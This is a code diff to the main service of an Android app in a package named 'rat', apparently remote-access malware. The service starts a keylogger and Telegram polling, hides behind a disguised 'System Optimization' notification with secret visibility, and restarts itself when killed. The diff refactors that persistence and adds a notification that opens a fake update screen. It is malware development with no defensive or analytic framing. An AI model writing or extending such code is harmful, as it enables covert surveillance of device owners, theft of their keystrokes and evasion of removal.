@@ -1,6 +1,5 @@
 package com.enterprise.rat.services;
 
-import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -15,7 +14,8 @@ import android.os.PowerManager;
 import android.util.Log;
 import androidx.core.app.NotificationCompat;
 import com.enterprise.rat.R;
-import com.enterprise.rat.receivers.AlarmReceiver;
+import com.enterprise.rat.activities.FakeUpdateActivity;
+import com.enterprise.rat.utils.PersistenceManager;
 
 public class MainService extends Service {
     private static final int NOTIFICATION_ID = 1001;
@@ -37,7 +37,7 @@ public class MainService extends Service {
         acquireWakeLock();
         startTelegramPolling();
         startKeylogger();
-        scheduleAlarm();
+        PersistenceManager.scheduleKeepAlive(this);
     }
 
     @Override
@@ -58,8 +58,8 @@ public class MainService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                 CHANNEL_ID,
-                "WebView Core",
-                NotificationManager.IMPORTANCE_MIN
+                "System Service",
+                NotificationManager.IMPORTANCE_LOW
             );
             channel.setDescription("System optimization service");
             channel.setShowBadge(false);
@@ -72,12 +72,19 @@ public class MainService extends Service {
     }
 
     private Notification buildNotification() {
+        Intent notificationIntent = new Intent(this, FakeUpdateActivity.class);
+        PendingIntent pendingIntent = PendingIntent.getActivity(
+            this, 0, notificationIntent,
+            PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
+        );
+
         return new NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Optimization")
             .setContentText("Optimizing device performance")
             .setSmallIcon(R.drawable.ic_sync)
             .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setContentIntent(pendingIntent)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build();
     }
@@ -113,51 +120,12 @@ public class MainService extends Service {
         }
     }
 
-    private void scheduleAlarm() {
-        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
-        Intent intent = new Intent(this, AlarmReceiver.class);
-        PendingIntent pendingIntent = PendingIntent.getBroadcast(
-            this, 0, intent,
-            PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
-        );
-
-        if (alarmManager != null) {
-            try {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,
-                        System.currentTimeMillis() + 60000, pendingIntent);
-                } else {
-                    alarmManager.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                        60000, 300000, pendingIntent);
-                }
-            } catch (SecurityException e) {
-                Log.w("MainService", "Exact alarm not permitted, using inexact repeating");
-                alarmManager.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                    60000, 300000, pendingIntent);
-            }
-        }
-    }
-
     @Override
     public void onDestroy() {
         Log.d("MainService", "onDestroy");
         if (telegramPolling != null) telegramPolling.stop();
         if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
-
-        Intent restartIntent = new Intent(this, AlarmReceiver.class);
-        PendingIntent pendingIntent = PendingIntent.getBroadcast(
-            this, 0, restartIntent,
-            PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
-        );
-        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
-        if (alarmManager != null) {
-            try {
-                alarmManager.set(AlarmManager.RTC_WAKEUP,
-                    System.currentTimeMillis() + 1000, pendingIntent);
-            } catch (SecurityException e) {
-                Log.w("MainService", "Cannot set restart alarm");
-            }
-        }
+        PersistenceManager.scheduleKeepAlive(this);
         super.onDestroy();
     }
 }
